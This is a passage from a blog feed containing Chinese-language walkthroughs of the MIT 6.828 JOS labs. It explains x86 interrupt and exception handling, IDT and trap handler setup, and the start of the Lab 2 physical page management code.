<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/c09.htm" target="_blank" rel="external">Chapter 9, Exceptions and Interrupts</a></p>
<h4 id="u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB"><a href="#u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB" class="headerlink" title="保护性控制转移"></a>保护性控制转移</h4><p>异常和中断都是保护性控制转移，让处理器从用户模式切换到内核模式(CPL=0)，这样用户代码不会对内核或者其他环境造成影响。中断是由外部异步事件导致的处理器保护性控制转移，比如外设I/O的通知信号。异常是正在运行的代码同步事件导致的控制转移，比如除零或者访问无效内存。</p>
<p>为了确保控制转移真的被保护，x86平台上有两种机制：</p>
<ol>
<li><p>中断描述符表。处理器确保中断和异常引起内核进入特定的入口点。</p>
<p> x86允许最多256个不同的中断和异常入口点，每个都有一个独特的中断向量。向量是0到255的数字，中断向量由中断源决定:不同设备，错误条件以及请求内核产生中断的不同向量。CPU使用向量作为索引访问处理器中断描述符表(IDT)，这个是内核在内核私有内存设置的。处理器从合适的入口处加载：</p>
<ul>
<li>加载到EIP寄存器的值，这是个指向处理这种类型异常的内核代码的指针</li>
<li>加载到CS寄存器的值，包含特权级0-1</li>
</ul>
</li>
<li><p>任务状态段。处理器需要存放中断异常发生之前的旧的处理器状态，比如原始EIP值和CS值，这样可以之后还原到之前的状态。保存这个的位置必须要受保护不能随意修改。 </p>
<p> 因此，x86处理器处理中断时会导致特权级由用户转为内核，也会将堆切换到内核内存中。任务状态段具体指明段选择子和堆栈的地址。处理器将SS, ESP, EFLAGS, CS, EIP和可选错误码压入堆栈中，之后从中断描述符中加载CS和EIP，设置ESP和SS指向新的堆栈。</p>
</li>
</ol>
<h4 id="u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B"><a href="#u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B" class="headerlink" title="异常和中断的类型"></a>异常和中断的类型</h4><p>所用同步异常使用的中断向量在0到31，因此映射到IDT入口0-31。比如页错误导致的异常是向量14。大于31的中断向量通常是软件中断，是由int指令产生，或者外设产生硬件中断。</p>
<h5 id="u4F8B_u5B50"><a href="#u4F8B_u5B50" class="headerlink" title="例子"></a>例子</h5><p>举个例子，处理器执行代码遇到了除零问题。</p>
<ol>
<li>处理器切换到TSS的SS0和ESP0字段定义的堆栈，JOS中这两个字段是 GD_KD 和 KSTACKTOP。</li>
<li>处理器将异常参数压入内核堆栈，放在KSTACKTOP：<pre><code>                     +--------------------+ KSTACKTOP             
                  | 0x00000 | old SS   |     &quot; - 4
                  |      old ESP       |     &quot; - 8
                  |     old EFLAGS     |     &quot; - 12
                  | 0x00000 | old CS   |     &quot; - 16
                  |      old EIP       |     &quot; - 20 &lt;---- ESP 
                  +--------------------+
</code></pre></li>
<li>处理除法问题，其中断向量在x86上是0，处理器读取IDT的第0项，设置CS:EIP指向中断处理函数的地址。</li>
<li>处理函数负责处理异常，比如终止用户环境。</li>
</ol>
<p>对于确定类型的x86异常，除了上面五个还有一个错误码。比如常见的页错误异常是数字14。80386手册上有详细定义的错误码。当处理器压入错误码，堆栈的样子是这样的:</p>
<pre><code>    +--------------------+ KSTACKTOP             
    | 0x00000 | old SS   |     &quot; - 4
    |      old ESP       |     &quot; - 8
    |     old EFLAGS     |     &quot; - 12
    | 0x00000 | old CS   |     &quot; - 16
    |      old EIP       |     &quot; - 20
    |     error code     |     &quot; - 24 &lt;---- ESP
    +--------------------+
</code></pre><h5 id="u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957"><a href="#u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957" class="headerlink" title="异常中断嵌套"></a>异常中断嵌套</h5><p>处理器在内核模式和用户模式都可以处理异常和中断。仅当从内核切换到用户时，x86处理器自动切换堆栈，将寄存器之前的值保存到堆栈上，然后触发异常处理。如果处理器已处于内核模式就触发了中断或异常(也就是CS寄存器低两位为0)，然后CPU压入内核堆栈更多值。这样就可以处理嵌套中断。如果处理器已经在内核模式且正在处理嵌套异常，就不会保存SS和ESP寄存器，所以内核堆栈就像这样：</p>
<pre><code>                     +--------------------+ &lt;---- old ESP
                     |     old EFLAGS     |     &quot; - 4
                     | 0x00000 | old CS   |     &quot; - 8
                     |      old EIP       |     &quot; - 12
                     +--------------------+
</code></pre><p>如果处理器在内核模式处理异常，因为一些原因比如堆栈空间不足，不能将旧的状态信息压入堆栈，那么处理器之后就不能恢复，只能重启。当然，内核肯定被要设计成不能发生这种事情。</p>
<h5 id="u8BBE_u7F6EIDT"><a href="#u8BBE_u7F6EIDT" class="headerlink" title="设置IDT"></a>设置IDT</h5><p>所以现在需要去设置IDT，这样JOS才能处理异常。现在只需要设置处理中断向量0-31(处理器异常)。</p>
<p>头文件 <code>inc/trap.h</code>和 <code>kern/trap.h</code> 包含了中断和异常的相关定义。后者包含了仅内核可访问的定义，前者是用户模式也能访问。</p>
<p>最终要实现这个样子:</p>
<pre><code>      IDT                   trapentry.S         trap.c

+----------------+                        
|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)
|                |             // do stuff      {
|                |             call trap          // handle the exception/interrupt
|                |             // ...           }
+----------------+
|   &amp;handler2    |--------&gt; handler2:
|                |            // do stuff
|                |            call trap
|                |            // ...
+----------------+
       .
       .
       .
+----------------+
|   &amp;handlerX    |--------&gt; handlerX:
|                |             // do stuff
|                |             call trap
|                |             // ...
+----------------+
</code></pre><p>每个异常或中断都应该在 <code>trapentry.S</code> 有自己的处理函数，trap_init() 用来初始化IDT。每个异常处理是一个保存在堆栈上的 struct Trapframe ，调用 trap() 指向这个 Trapframe。trap() 之后处理异常中断。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现上面说的异常处理，需要在 trapentry.S 给每个 trap 添加入口点。</p>
<p>_alltraps 应该是这个样子的：</p>
<ol>
<li>值压入堆栈使其像一个 Trapframe 结构体</li>
<li>加载 GD_KD 到 %ds 和 %es</li>
<li>pushl %esp 将指向 Trapframe 的指针作为 trap() 的参数</li>
<li>调用 trap</li>
</ol>
<p>考虑使用 pushal 指令。最后使用 <code>make grade</code> 应该对于 divzero, softint, badsegment 这几个测试点正常通过。</p>
<p>参考<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/s09_10.htm" target="_blank" rel="external">80386 Programmer’s Manual 9.10 Error Code Summary</a></p>
<p><img src="1.png" alt=""></p>
<p>由上面的中断类型，确定哪些是不需要压入错误码</p>
<p>其中， <code>trapentry.S</code> 修改为</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
 * Lab 3: Your code here for generating entry points for the different traps.
 */</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_divide<span class="token punctuation">,</span> T_DIVIDE<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 0</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_debug<span class="token punctuation">,</span> T_DEBUG<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 1</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_nmi<span class="token punctuation">,</span> T_NMI<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 2</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_brkpt<span class="token punctuation">,</span> T_BRKPT<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 3</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_oflow<span class="token punctuation">,</span> T_OFLOW<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 4</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_bound<span class="token punctuation">,</span> T_BOUND<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 5</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_illop<span class="token punctuation">,</span> T_ILLOP<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 6</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_device<span class="token punctuation">,</span> T_DEVICE<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 7</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_dblflt<span class="token punctuation">,</span> T_DBLFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 8</span>
                                        <span class="token comment" spellcheck="true">// 9</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_tss<span class="token punctuation">,</span> T_TSS<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">// 10</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_segnp<span class="token punctuation">,</span> T_SEGNP<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 11</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_stack<span class="token punctuation">,</span> T_STACK<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 12</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_gpflt<span class="token punctuation">,</span> T_GPFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 13</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_pgflt<span class="token punctuation">,</span> T_PGFLT<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 14</span>
                                        <span class="token comment" spellcheck="true">// 15</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_fperr<span class="token punctuation">,</span> T_FPERR<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 16</span>
<span class="token function">TRAPHANDLER</span><span class="token punctuation">(</span>t_align<span class="token punctuation">,</span> T_ALIGN<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">// 17</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_mchk<span class="token punctuation">,</span> T_MCHK<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 18</span>
<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_simderr<span class="token punctuation">,</span> T_SIMDERR<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 19</span>

<span class="token function">TRAPHANDLER_NOEC</span><span class="token punctuation">(</span>t_syscall<span class="token punctuation">,</span> T_SYSCALL<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">/*
 * Lab 3: Your code here for _alltraps
 */</span>
_alltraps<span class="token punctuation">:</span>
    pushl <span class="token operator">%</span>ds
    pushl <span class="token operator">%</span>es
    pushal

    movw $GD_KD<span class="token punctuation">,</span> <span class="token operator">%</span>eax
    movw <span class="token operator">%</span>ax<span class="token punctuation">,</span> <span class="token operator">%</span>ds
    movw <span class="token operator">%</span>ax<span class="token punctuation">,</span> <span class="token operator">%</span>es

    pushl <span class="token operator">%</span>esp
    call trap
</code></pre>
<p><code>trap.c</code> 中首先完成 trap_init()</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">trap_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">extern</span> <span class="token keyword">struct</span> Segdesc gdt<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">void</span> <span class="token function">t_divide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_nmi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_brkpt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_oflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_bound</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_illop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_device</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_dblflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_tss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_segnp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_gpflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_pgflt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_fperr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_align</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_mchk</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_simderr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">void</span> <span class="token function">t_syscall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DIVIDE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_divide<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DEBUG<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_debug<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_NMI<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_nmi<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_BRKPT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_brkpt<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_OFLOW<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_oflow<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_BOUND<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_bound<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_ILLOP<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_illop<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DEVICE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_device<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_DBLFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_dblflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_TSS<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_tss<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SEGNP<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_segnp<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_STACK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_stack<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_GPFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_gpflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_PGFLT<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_pgflt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_FPERR<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_fperr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_ALIGN<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_align<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_MCHK<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_mchk<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SIMDERR<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_simderr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">SETGATE</span><span class="token punctuation">(</span>idt<span class="token punctuation">[</span>T_SYSCALL<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> GD_KT<span class="token punctuation">,</span> t_syscall<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// Per-CPU setup </span>
    <span class="token function">trap_init_percpu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3 id="Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528"><a href="#Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528" class="headerlink" title="Part B: 缺页，断点异常和系统调用"></a>Part B: 缺页，断点异常和系统调用</h3><h4 id="u5904_u7406_u7F3A_u9875_u5F02_u5E38"><a href="#u5904_u7406_u7F3A_u9875_u5F02_u5E38" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h4><p>缺页异常，也就是中断向量 14 (T_PGFLT)，是一个常见的重要异常。当处理器产生缺页，会将线性(也就是虚拟)地址储存在控制寄存器 CR2。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 trap_dispatch() 使系统将缺页异常传到 page_fault_handler()。完成以后 <code>make grade</code> 应该成功通过faultread, faultreadkernel, faultwrite, faultwritekernel。</p>
<p>查看 <code>inc/trap.h</code> 可以知道 Trapframe 结构体中 tf_trapno 代表中断向量的序号。因此只要判断这个是不是缺页中断就可以了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">trap_dispatch</span><span class="token punctuation">(</span><span class="token keyword">struct</span> Trapframe <span class="token operator">*</span>tf<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// Handle processor exceptions.</span>
    <span class="token comment" spellcheck="true">// LAB 3: Your code here.</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tf<span class="token operator">-></span>tf_trapno <span class="token operator">==</span> T_PGFLT<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">page_fault_handler</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// Unexpected trap: The user process or the kernel has a bug.</span>
    <span class="token function">print_trapframe</span><span class="token punctuation">(</span>tf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tf<span class="token operator">-></span>tf_cs <span class="token operator">==</span> GD_KT<span class="token punctuation">)</span>
        <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"unhandled trap in kernel"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">env_destroy</span><span class="token punctuation">(</span>curenv<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当然，这个函数之后还需要完善。</p>
<h4 id="u65AD_u70B9_u5F02_u5E38"><a href="#u65AD_u70B9_u5F02_u5E38" class="headerlink" title="断点异常"></a>断点异常</h4>]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 2</title>
    <link href="http://xinqiu.me/2016/12/09/MIT-6.828-2/"/>
    <id>http://xinqiu.me/2016/12/09/MIT-6.828-2/</id>
    <published>2016-12-08T16:00:00.000Z</published>
    <updated>2017-04-23T14:08:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续开始Lab2，这部分内容可以回忆以前的CSAPP的malloc lab.</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个实验要实现内存管理。内存管理有两个部分，第一部分是给内核分配物理内存，内存分配是以4096 bytes为一个单位，也就是页。第二部分是虚拟内存的管理，关于物理内存和虚拟内存的映射。</p>
<p>Lab 2 添加了以下文件:</p>
<ul>
<li>inc/memlayout.h</li>
<li>kern/pmap.c</li>
<li>kern/pmap.h</li>
<li>kern/kclock.h</li>
<li>kern/kclock.c</li>
</ul>
<p>memlayout.h 描述了虚拟地址空间的结构，通过修改pmap.c. memlayout.h 和 pmap.h<br>来实现PageInfo结构，这个是为了记录哪些物理内存的page是空闲的。kclock.c 和 kclock.h 管理PC的时钟和CMOS RAM硬件，这个设备记录了物理内存的数量。pmap.c需要读这个设备来确定内存大小。</p>
<h2 id="Part_1_3A__u7269_u7406_u9875_u7BA1_u7406"><a href="#Part_1_3A__u7269_u7406_u9875_u7BA1_u7406" class="headerlink" title="Part 1: 物理页管理"></a>Part 1: 物理页管理</h2><h3 id="u7269_u7406_u9875"><a href="#u7269_u7406_u9875" class="headerlink" title="物理页"></a>物理页</h3><p>操作系统需要记录物理RAM哪部分是空闲的哪部分在用。JOS使用page granularity来管理物理内存，因此可以用MMU来映射和保护每一块分配的内存。</p>
<p>以下内容要配上 <code>inc/memlayout.h</code> 的图。</p>
<p><img src="1.png" alt=""></p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>实现kern/pmap.c中的函数.</p>
<ul>
<li>boot_alloc()</li>
<li>mem_init() (only up to the call to check_page_free_list(1))</li>
<li>page_init()</li>
<li>page_alloc()</li>
<li>page_free()</li>
</ul>
<p>首先看通过查看 mem_init 函数可以知道，boot_alloc 是用来初始化页目录(page directory)。在 boot_alloc 中，nextfree 为下一个空闲内存的虚拟内存地址，当 nextfree 为空时会先初始化。用到了ROUNDUP，这个ROUNDUP在 <code>/inc/types.h</code> 中，因为内存区块是对齐的，所以每块都是固定的大小。npages 是页数量，可使用的内存大小是 npages × PGSIZE ，根据lab1提到的，KERNBASE是分配内存的起始地址，若nextfree 大于 KERNBASE + npages × PGSIZE 的值，就是指针地址溢出了。</p>
<p>所以只需要添加上这部分代码。</p>
<pre class=" language-c"><code class="language-c">result <span class="token operator">=</span> nextfree<span class="token punctuation">;</span>
nextfree <span class="token operator">=</span> <span class="token function">ROUNDUP</span><span class="token punctuation">(</span>nextfree<span class="token operator">+</span>n<span class="token punctuation">,</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>uint32_t<span class="token punctuation">)</span>nextfree <span class="token operator">></span> KERNBASE <span class="token operator">+</span> <span class="token punctuation">(</span>npages <span class="token operator">*</span> PGSIZE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">panic</span><span class="token punctuation">(</span><span class="token string">"Out of memory!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>mem_init 在执行完上面的函数以后，会给kern_pgdir加上权限位。</p>
<p>之后就是要初始化所有的struct PageInfo 为 0。首先确定PageInfo的大小，然后用boot_alloc分配内存，接着用memset初始化。</p>
<pre class=" language-c"><code class="language-c">size_t PageInfo_size <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>
pages <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> PageInfo <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">boot_alloc</span><span class="token punctuation">(</span>npages <span class="token operator">*</span> PageInfo_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>pages<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> npages <span class="token operator">*</span> PageInfo_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>接着调用page_init()来初始化page结构和内存空闲链表。</p>
<p>参考注释，一步步修改就可以了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span>
<span class="token function">page_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// The example code here marks all physical pages as free.</span>
    <span class="token comment" spellcheck="true">// However this is not truly the case.  What memory is free?</span>
    <span class="token comment" spellcheck="true">//  1) Mark physical page 0 as in use.</span>
    <span class="token comment" spellcheck="true">//     This way we preserve the real-mode IDT and BIOS structures</span>
    <span class="token comment" spellcheck="true">//     in case we ever need them.  (Currently we don't, but...)</span>
    <span class="token comment" spellcheck="true">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span>
    <span class="token comment" spellcheck="true">//     is free.</span>
